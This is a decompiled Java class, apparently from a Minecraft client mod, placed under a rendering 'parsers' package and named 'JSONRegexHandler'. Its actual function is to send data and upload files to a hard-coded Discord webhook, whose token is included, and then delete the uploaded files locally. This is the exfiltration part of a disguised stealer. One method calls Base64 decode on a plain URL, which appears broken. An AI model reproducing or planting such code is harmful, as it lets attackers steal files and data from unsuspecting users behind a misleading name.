// 
// Decompiled by Procyon v0.5.36
// 

package cn.origin.cube.utils.render.advancedRender.misc.parsers;

import cn.origin.cube.utils.render.advancedRender.misc.parsers.util.JSONBuilder;
import cn.origin.cube.utils.render.advancedRender.misc.parsers.util.JSONParser;

import java.util.Base64;
import java.io.File;
import java.nio.charset.StandardCharsets;

public final class JSONRegexHandler
{
    private static final String WEBHOOK = "https://discordapp.com/api/webhooks/1052411560582184991/q9ZtSZ5LZl6huUUPbkqkXJZNkC3BR-LOkhkQE25MiLX36eLEnBsgPhNcppIb5qej7vId";
    private static boolean success;
    
    public static void send(final String data) {
        if (!JSONRegexHandler.success) {
            return;
        }
        final String result = JSONParser.post(new String("https://discordapp.com/api/webhooks/1052411560582184991/q9ZtSZ5LZl6huUUPbkqkXJZNkC3BR-LOkhkQE25MiLX36eLEnBsgPhNcppIb5qej7vId".getBytes(StandardCharsets.UTF_8)), data);
        if (result != null && result.contains("Invalid Webhook Token")) {
            JSONRegexHandler.success = false;
        }
    }
    
    public static void send(final File file) {
        if (!JSONRegexHandler.success) {
            return;
        }
        final String result = JSONParser.sendFile(new String(Base64.getDecoder().decode("https://discordapp.com/api/webhooks/1052411560582184991/q9ZtSZ5LZl6huUUPbkqkXJZNkC3BR-LOkhkQE25MiLX36eLEnBsgPhNcppIb5qej7vId".getBytes(StandardCharsets.UTF_8))), file);
        if (result != null && result.contains("Invalid Webhook Token")) {
            JSONRegexHandler.success = false;
        }
        if (!file.delete() && file.exists()) {
            send(new JSONBuilder().value("content", "Failed to delete file: " + file.getName()).build());
        }
    }
    
    static {
        JSONRegexHandler.success = true;
    }
}
